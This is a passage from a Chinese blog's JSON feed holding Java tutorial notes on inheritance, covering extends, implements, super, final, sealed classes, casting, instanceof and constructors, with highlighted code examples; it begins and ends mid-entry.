class=\"token punctuation\">}</span>\n</code></pre></div><p>其实就是JVM帮我们自动编写了一个上述类（不需要源码，可以直接生成字节码），并不存在可以直接实例化接口的黑魔法。</p>\n",
      "date_published": "2024-09-04T09:28:48.000Z",
      "date_modified": "2024-09-06T08:31:38.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "Java",
      "url": "https://echo0d.github.io/DailyNotes/develop/Java/",
      "id": "https://echo0d.github.io/DailyNotes/develop/Java/",
      "summary": "Java\n😭虽然但是，写了也记不住~~",
      "content_html": "\n<p>😭虽然但是，写了也记不住~~</p>\n",
      "date_published": "2024-09-04T09:28:48.000Z",
      "date_modified": "2024-09-04T09:28:48.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "2-Java面向对象",
      "url": "https://echo0d.github.io/DailyNotes/develop/Java/2_ObjectOriented.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Java/2_ObjectOriented.html",
      "summary": "2-Java面向对象\n继承\n在Java中，继承是一种面向对象编程的重要概念，它允许一个类（子类）获取另一个类（父类）的属性和方法。这种机制使代码重用变得更加容易，同时也有助于建立类之间的层次结构。以下是关于Java继承的一些详细介绍：\n类的继承格式\n在 Java 中通过 extends 关键字可以申明一个类是从另外一个类继承而来的，一般形式如下：\n继承...",
      "content_html": "\n<h2>继承</h2>\n<p>在Java中，继承是一种面向对象编程的重要概念，它允许一个类（子类）获取另一个类（父类）的属性和方法。这种机制使代码重用变得更加容易，同时也有助于建立类之间的层次结构。以下是关于Java继承的一些详细介绍：</p>\n<h3>类的继承格式</h3>\n<p>在 Java 中通过 extends 关键字可以申明一个类是从另外一个类继承而来的，一般形式如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">class</span> 父类 <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">class</span> 子类 <span class=\"token keyword\">extends</span> 父类 <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>继承类型</h3>\n<p>需要注意的是 Java 不支持多继承，但支持多重继承。</p>\n<figure><figcaption>img</figcaption></figure>\n<h3>继承的特性</h3>\n<ul>\n<li>子类拥有父类非 private 的属性、方法。</li>\n<li>子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。</li>\n<li>子类可以用自己的方式实现父类的方法。</li>\n<li>Java 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 B 类继承 A 类，C 类继承 B 类，所以按照关系就是 B 类是 C 类的父类，A 类是 B 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。</li>\n<li>提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。</li>\n</ul>\n<h3>继承关键字</h3>\n<p>继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 <code>java.lang.Object</code>，当一个类没有继承的两个关键字，则默认继承 Object（这个类在 <code>java.lang</code> 包中，所以不需要 <code>import</code>）祖先类。</p>\n<h3>extends关键字</h3>\n<p>在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Animal</span> <span class=\"token punctuation\">{</span> \n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>   \n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> id<span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Animal</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> myName<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> myid<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> \n        <span class=\"token comment\">//初始化属性值</span>\n    <span class=\"token punctuation\">}</span> \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>  <span class=\"token comment\">//吃东西方法的具体实现  } </span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">//睡觉方法的具体实现  } </span>\n<span class=\"token punctuation\">}</span> \n \n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Penguin</span>  <span class=\"token keyword\">extends</span>  <span class=\"token class-name\">Animal</span><span class=\"token punctuation\">{</span> \n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>implements关键字</h3>\n<p>使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">A</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">B</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">C</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">B</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>super 与 this 关键字</h3>\n<p>**super 关键字：**我们可以通过 super 关键字来实现对父类成员的访问，用来引用当前对象的父类。</p>\n<p>**this 关键字：**指向自己的引用，引用当前对象，即它所在的方法或构造函数所属的对象实例。。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">class</span> <span class=\"token class-name\">Animal</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">void</span> <span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"animal : eat\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Dog</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Animal</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">void</span> <span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dog : eat\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">void</span> <span class=\"token function\">eatTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// this 调用自己的方法</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// super 调用父类方法</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Animal</span> a <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Animal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        a<span class=\"token punctuation\">.</span><span class=\"token function\">eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Dog</span> d <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Dog</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        d<span class=\"token punctuation\">.</span><span class=\"token function\">eatTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>输出结果为：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>animal <span class=\"token operator\">:</span> eat\ndog <span class=\"token operator\">:</span> eat\nanimal <span class=\"token operator\">:</span> eat\n\n</code></pre></div><h3>final 关键字</h3>\n<p>final 可以用来修饰变量（包括类属性、对象属性、局部变量和形参）、方法（包括类方法和对象方法）和类。final 含义为 \"最终的\"。使用 final 关键字声明类，就是把类定义定义为最终类，不能被继承，或者用于修饰方法，该方法不能被子类重写：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 声明类：</span>\n<span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> 类名 <span class=\"token punctuation\">{</span><span class=\"token comment\">//类体}</span>\n\n<span class=\"token comment\">// 声明方法：</span>\n修饰符<span class=\"token punctuation\">(</span><span class=\"token keyword\">public</span><span class=\"token operator\">/</span><span class=\"token keyword\">private</span><span class=\"token operator\">/</span><span class=\"token keyword\">default</span><span class=\"token operator\">/</span><span class=\"token keyword\">protected</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">final</span> 返回值类型 方法名<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token comment\">//方法体}</span>\n</code></pre></div><h3>阻止继承</h3>\n<p>正常情况下，只要某个class没有<code>final</code>修饰符，那么任何类都可以从该class继承。</p>\n<p>从Java 15开始，允许使用<code>sealed</code>修饰class，并通过<code>permits</code>明确写出能够从该class继承的子类名称。</p>\n<p>例如，定义一个<code>Shape</code>类：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">sealed</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Shape</span> <span class=\"token keyword\">permits</span> <span class=\"token class-name\">Rect</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Circle</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Triangle</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>上述<code>Shape</code>类就是一个<code>sealed</code>类，它只允许指定的3个类继承它。如果写：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Rect</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Shape</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n</code></pre></div><p>是没问题的，因为<code>Rect</code>出现在<code>Shape</code>的<code>permits</code>列表中。但是，如果定义一个<code>Ellipse</code>就会报错：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Ellipse</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Shape</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// Compile error: class is not allowed to extend sealed class: Shape</span>\n</code></pre></div><p>原因是<code>Ellipse</code>并未出现在<code>Shape</code>的<code>permits</code>列表中。这种<code>sealed</code>类主要用于一些框架，防止继承被滥用。</p>\n<p><code>sealed</code>类在Java 15中目前是预览状态，要启用它，必须使用参数<code>--enable-preview</code>和<code>--source 15</code>。</p>\n<h3>向上转型</h3>\n<p>如果一个引用变量的类型是<code>Student</code>，那么它可以指向一个<code>Student</code>类型的实例：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Student</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>如果一个引用类型的变量是<code>Person</code>，那么它可以指向一个<code>Person</code>类型的实例：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>现在问题来了：如果<code>Student</code>是从<code>Person</code>继承下来的，那么，一个引用类型为<code>Person</code>的变量，能否指向<code>Student</code>类型的实例？</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ???</span>\n</code></pre></div><p>测试一下就可以发现，这种指向是允许的！</p>\n<p>这是因为<code>Student</code>继承自<code>Person</code>，因此，它拥有<code>Person</code>的全部功能。<code>Person</code>类型的变量，如果指向<code>Student</code>类型的实例，对它进行操作，是没有问题的！</p>\n<p>这种把一个子类类型安全地变为父类类型的赋值，被称为向上转型（upcasting）。</p>\n<p>向上转型实际上是把一个子类型安全地变为更加抽象的父类型：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Student</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> s<span class=\"token punctuation\">;</span> <span class=\"token comment\">// upcasting, ok</span>\n<span class=\"token class-name\">Object</span> o1 <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span> <span class=\"token comment\">// upcasting, ok</span>\n<span class=\"token class-name\">Object</span> o2 <span class=\"token operator\">=</span> s<span class=\"token punctuation\">;</span> <span class=\"token comment\">// upcasting, ok</span>\n</code></pre></div><p>注意到继承树是<code>Student &gt; Person &gt; Object</code>，所以，可以把<code>Student</code>类型转型为<code>Person</code>，或者更高层次的<code>Object</code>。</p>\n<h3>向下转型</h3>\n<p>和向上转型相反，如果把一个父类类型强制转型为子类类型，就是向下转型（downcasting）。例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Person</span> p1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// upcasting, ok</span>\n<span class=\"token class-name\">Person</span> p2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Student</span> s1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Student</span><span class=\"token punctuation\">)</span> p1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// ok</span>\n<span class=\"token class-name\">Student</span> s2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Student</span><span class=\"token punctuation\">)</span> p2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// runtime error! ClassCastException!</span>\n</code></pre></div><p>如果测试上面的代码，可以发现：</p>\n<p><code>Person</code>类型<code>p1</code>实际指向<code>Student</code>实例，<code>Person</code>类型变量<code>p2</code>实际指向<code>Person</code>实例。在向下转型的时候，把<code>p1</code>转型为<code>Student</code>会成功，因为<code>p1</code>确实指向<code>Student</code>实例，把<code>p2</code>转型为<code>Student</code>会失败，因为<code>p2</code>的实际类型是<code>Person</code>，不能把父类变为子类，因为子类功能比父类多，多的功能无法凭空变出来。</p>\n<p>因此，向下转型很可能会失败。失败的时候，Java虚拟机会报<code>ClassCastException</code>。</p>\n<p>为了避免向下转型出错，Java提供了<code>instanceof</code>操作符，可以先判断一个实例究竟是不是某种类型：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>p <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>p <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span>\n\n<span class=\"token class-name\">Student</span> s <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n\n<span class=\"token class-name\">Student</span> n <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>n <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span>\n</code></pre></div><p><code>instanceof</code>实际上判断一个变量所指向的实例是否是指定类型，或者这个类型的子类。如果一个引用变量为<code>null</code>，那么对任何<code>instanceof</code>的判断都为<code>false</code>。</p>\n<p>利用<code>instanceof</code>，在向下转型前可以先判断：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 只有判断成功才会向下转型:</span>\n    <span class=\"token class-name\">Student</span> s <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Student</span><span class=\"token punctuation\">)</span> p<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 一定会成功</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>从Java 14开始，判断<code>instanceof</code>后，可以直接转型为指定变量，避免再次强制转型。例如，对于以下代码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>obj <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> obj<span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>可以改写如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// instanceof variable:</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>obj <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">String</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// 可以直接使用变量s:</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>这种使用<code>instanceof</code>的写法更加简洁。</p>\n<h3>构造器</h3>\n<p>子类是不继承父类的构造器（构造方法或者构造函数）的，它只是调用（隐式或显式）。如果父类的构造器带有参数，则必须在子类的构造器中显式地通过 <strong>super</strong> 关键字调用父类的构造器并配以适当的参数列表。</p>\n<p>如果父类构造器没有参数，则在子类的构造器中不需要使用 <strong>super</strong> 关键字调用父类构造器，系统会自动调用父类的无参构造器。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">class</span> <span class=\"token class-name\">SuperClass</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">;</span>\n \n    <span class=\"token comment\">// 无参数构造器</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">SuperClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SuperClass()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n \n    <span class=\"token comment\">// 带参数构造器</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">SuperClass</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SuperClass(int n)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n <span class=\"token operator\">=</span> n<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token comment\">// SubClass 类继承</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">SubClass</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">SuperClass</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">;</span>\n \n    <span class=\"token comment\">// 无参数构造器，自动调用父类的无参数构造器</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">SubClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SubClass()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n \n    <span class=\"token comment\">// 带参数构造器，调用父类中带有参数的构造器</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">SubClass</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token number\">300</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SubClass(int n): \"</span> <span class=\"token operator\">+</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>n <span class=\"token operator\">=</span> n<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token comment\">// SubClass2 类继承</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">SubClass2</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">SuperClass</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">;</span>\n \n    <span class=\"token comment\">// 无参数构造器，调用父类中带有参数的构造器</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">SubClass2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token number\">300</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SubClass2()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n \n    <span class=\"token comment\">// 